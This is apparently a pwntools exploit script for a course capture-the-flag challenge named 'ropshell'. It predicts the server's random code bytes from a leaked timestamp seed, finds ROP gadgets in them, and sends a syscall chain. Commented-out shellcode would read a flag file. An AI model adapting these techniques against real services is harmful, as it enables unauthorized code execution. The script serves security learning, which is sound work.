#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import numpy as np
import struct
import ctypes
libc = ctypes.CDLL('libc.so.6')

LEN_CODE = int('0x10000', 16)*10

context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell_new", shell=False)
    # pw.pause()
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)


if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

r.recvuntil(b'Timestamp is ')
t = r.recvline().strip()
print("Timestamp is :",t)



libc.srand(int(t))
# print("{:x}".format(libc.rand()))
# print("{:u}".format(libc.rand() << 16 & mask))
# print("{:x}".format(libc.rand() & 0xffff))

# codeint = np.empty(LEN_CODE)
# print(codeint.shape)
codeint = []
mask = 2 ** 32 - 1
for i in range(LEN_CODE//4) :
    codeint.append(((libc.rand() << 16  & mask) | (libc.rand() & 0xffff)))
k = libc.rand() % (LEN_CODE//4 - 1)
codeint[k] = 0xc3050f

byte_array = bytearray()
for interger in codeint:
    byte_array.extend(struct.pack("I", interger))  #I: unsigned int, integer, 4 bytes
byte =bytes(byte_array)

# print("byte = ", byte)
# print("byte_array = ", byte_array)

# for i in range(len(byte_array)):
#     print("byte_array["+str(i)+"] = "+ str(struct.pack("B",byte_array[i])))  #B: unsigned char, integer, 1 byte

# for i in range(len(byte)):
#     print("byte["+str(i)+"] = "+ str(struct.pack("B",byte[i])))  #B: unsigned char, integer, 1 byte

# if byte_array.find(b'\x05\xc3') != -1: 
#     index = byte_array.find(b'\x05\xc3')
#     print("byte_array.find(b'\x05\xc3') = ", index)
#     print(byte_array[index])

# if byte.find(b'\x05\xc3') != -1: 
#     index = byte.find(b'\x05\xc3')
#     print("byte.find(b'\x05\xc3') = ", index)
#     print(byte[index])

# arr = np.array(codeint)
# buf = b''.join([arr[i] for i in range(arr.shape[0]) ])
# print("buf = ", buf)

r.recvuntil(b'Random bytes generated at ')
code_start_address = r.recvline().strip()
print("code atart at : ", code_start_address)
print("=========================")


if byte.find(b'X\xc3') != -1:  # X\xc3 is "pop rax;ret" machine code
    index = byte.find(b'X\xc3')
    addr1 = int(code_start_address, 16)+index
    print(f"find  pop rax;ret : {index}, hex(addr1) = {hex(addr1)}")
    print("byte_array["+str(index)+"] = "+ str(struct.pack("B",byte[index]))) 

if byte_array.find(b'_\xc3') != -1:  #"pop rdi;ret"
    index = byte_array.find(b'_\xc3')
    addr2 = int(code_start_address, 16)+index
    print(f"find  pop rdi;ret : {index}, hex(addr2) = {hex(addr2)}")
    print("byte_array["+str(index)+"] = "+ str(struct.pack("B",byte_array[index]))) 

if byte_array.find(b'\x0f\x05\xc3') != -1:  #"syscall;ret"
    index = byte_array.find(b'\x0f\x05\xc3')
    addr3 = int(code_start_address, 16)+index
    print(f"find  syscall;ret : {index}, hex(addr3) = {hex(addr3)}")
    print("byte_array["+str(index)+"] = "+ str(struct.pack("B",byte_array[index])))

addr = int(code_start_address, 16)+k*4
print(f"syscall;ret : codeint[{k}] = {codeint[k]}, addr at {hex(addr)}")

# # address low->high
buf = b''.join([p64(addr1), p64(60), p64(addr2), p64(0), p64(addr3)])
print("send to server = ", buf)
r.send(buf)


# # print("=========================")
# # shellcode = ''
# # shellcode += shellcraft.open('./FLAG')
# # shellcode += shellcraft.read('rax', 'rsp', 100)
# # shellcode += shellcraft.write(1, 'rsp', 100)
# # sh = asm(shellcode)
# # print(sh)
# # print("=========================")
# # print(disasm(sh))
# # buf = b''.join([str(myguess).encode('ascii').ljust(24, b'\0'), p64(canary), p64(rbp), p64(return_addr),b'\0'*12, p64(myguess)])
# # print("buf = ", buf)
# # r.send(sh)


# experiment
payload = asm("""
syscall;ret""")
print(payload)  
print("=========================")
print(disasm(payload))
 
# print("c35f = ", hex(int('0xc35f', 16)))  #c35f =  50015  "pop rdi;ret" #b'_\xc3'
# print("c3050f = ", int('0xc3050f', 16))  #c3050f =  12780815  "syscall;ret"
# print("c358 = ", int('c358', 16))  #50008  "pop rax;ret"  #b'X\xc3'
# buf = "0xc3050f"
# if buf.find("c3") != -1:
#     print("find  pop rax;ret @ " , buf.find("c3"))



r.interactive()
# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :